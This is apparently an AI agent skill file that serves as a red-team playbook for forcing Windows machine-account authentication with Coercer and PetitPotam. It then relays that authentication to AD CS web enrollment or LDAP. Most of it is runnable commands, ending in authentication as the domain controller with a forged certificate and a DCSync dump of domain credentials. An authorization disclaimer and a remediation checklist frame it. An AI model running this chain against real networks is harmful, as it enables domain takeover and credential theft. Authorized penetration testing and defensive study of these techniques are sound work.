---
name: coercing-authentication-with-coercer-petitpotam
description: Trigger machine account authentication with PetitPotam (MS-EFSR) and Coercer (MS-RPRN, MS-DFSNM, MS-FSRVP, MS-EVEN) via Coercer's scan/coerce/fuzz modes, feeding the coerced NTLM auth into a relay against AD CS Web Enrollment (ESC8), LDAP (RBCD), or SMB.
subdomain: red-teaming
facing: config
mitre_attack:
- T1187
nist_csf:
- DE.CM-01
upstream: coercing-authentication-with-coercer-petitpotam@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Authentication coercion combined with NTLM relay can yield domain compromise. Use only against systems you own or have explicit written authorization to test. Unauthorized use is illegal.

## Prerequisites

- Authorized scope including coercion and NTLM relay techniques
- Valid (often low-privileged) domain credentials; some methods work unauthenticated against unpatched hosts
- Relay listener (Certipy `relay` or Impacket `ntlmrelayx`) on reachable host
- Network reachability to target's RPC endpoints (135 + dynamic, 445)
- Linux attack host with Python 3.8+; install tools:
  ```bash
  # Coercer
  pipx install coercer        # or: sudo python3 -m pip install coercer
  coercer --help
  # PetitPotam (source)
  git clone https://github.com/topotam/PetitPotam
  # Impacket (provides ntlmrelayx, dFSCoerce etc.)
  pipx install impacket
  ```

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1187 | Forced Authentication | Using MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP RPC methods to force target machine account to authenticate to attacker-controlled host |

Chained techniques: T1557.001 (LLMNR/NBT-NS Poisoning and SMB/NTLM Relay) and T1649 (Steal or Forge Authentication Certificates) when relayed into AD CS.

## Workflow

### Step 1: Scan target for coercible methods

Use Coercer's scan mode to enumerate which RPC methods on target can be leveraged. This identifies best coercion vector without firing full attack.

```bash
coercer scan -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50
```
`-t` is target (e.g., DC), `-l` is listener IP that should receive coerced authentication.

### Step 2: Stand up relay (ESC8 example)

In separate terminal, start relay aimed at AD CS web enrollment so any relayed DC authentication yields DomainController certificate.

```bash
# Certipy relay into HTTP web enrollment (ESC8)
certipy relay -target 'http://CA.CORP.LOCAL' -template 'DomainController'

# Alternative: Impacket ntlmrelayx
impacket-ntlmrelayx -t http://CA.CORP.LOCAL/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController
```

### Step 3: Coerce authentication with Coercer

Trigger target machine account to authenticate to relay/listener. `--always-continue` tries every method until one succeeds.

```bash
coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50 --always-continue
```
To use single specific method (quieter), filter by method name:
```bash
coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50 --filter-method-name PetitPotam
```

### Step 4: Coerce with PetitPotam directly (MS-EFSR)

PetitPotam is canonical MS-EFSR coercion and works unauthenticated against unpatched DCs. Syntax: `petitpotam.py <listener> <target>`.

```bash
# Unauthenticated attempt
python3 PetitPotam.py 10.0.0.50 10.0.0.10
# Authenticated (more reliable on patched-but-vulnerable hosts)
python3 PetitPotam.py -u attacker -p 'Passw0rd!' -d corp.local 10.0.0.50 10.0.0.10
```

### Step 5: Use relayed result

For ESC8, relay writes DC certificate (`dc.pfx`). Authenticate as DC and DCSync.

```bash
certipy auth -pfx 'dc$.pfx' -dc-ip 10.0.0.100
# Then DCSync with the recovered DC credential
impacket-secretsdump -k -no-pass 'corp.local/dc$@dc.corp.local' -just-dc
```

### Step 6: Relay to LDAP for RBCD (alternative chain)

If ESC8 is unavailable, relay coerced auth to LDAP to configure Resource-Based Constrained Delegation.

```bash
# Relay to LDAP and delegate to attacker-controlled computer account
impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access \
    --escalate-user 'attacker$' -smb2support
# Then coerce as in Step 3
```

### Step 7: Fuzz mode for unpatched-path discovery (research)

Fuzz mode varies UNC paths to find coercion paths bypassing partial patches.

```bash
coercer fuzz -u 'attacker' -p 'Passw0rd!' -d corp.local \
    -t 10.0.0.10 -l 10.0.0.50
```

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Coercer | Multi-method automated coercion (12 methods) | https://github.com/p0dalirius/Coercer |
| PetitPotam | MS-EFSR coercion | https://github.com/topotam/PetitPotam |
| Certipy relay | ESC8/ESC11 relay target | https://github.com/ly4k/Certipy |
| Impacket ntlmrelayx | Relay to AD CS / LDAP / SMB | https://github.com/fortra/impacket |
| Hacker Recipes | Coercion & relay theory | https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications |

## Coercion Method Reference

| Method | Protocol | Notes |
|--------|----------|-------|
| PetitPotam | MS-EFSR | EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv; classic ESC8 trigger |
| PrinterBug / SpoolSample | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx; needs Spooler |
| DFSCoerce | MS-DFSNM | NetrDfsAddStdRoot; often works post-PetitPotam patch |
| ShadowCoerce | MS-FSRVP | IsPathSupported / IsPathShadowCopied |
| Others (Coercer) | MS-EVEN, etc. | 12 methods total; use `scan` to enumerate |

## Validation Criteria

- [ ] Coercer scan identified at least one reachable coercion method on target
- [ ] Relay listener stood up against confirmed vulnerable service
- [ ] Target machine account successfully coerced to authenticate to listener
- [ ] Relayed artifact obtained (DC certificate, RBCD write, or SMB exec)
- [ ] (ESC8) DC certificate used to authenticate and DCSync demonstrated
- [ ] Coercible methods documented with affected host and patch recommendation
- [ ] Relay mitigations (SMB/LDAP signing, EPA, RPC filters) validated or flagged

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/coercing-authentication-with-coercer-petitpotam
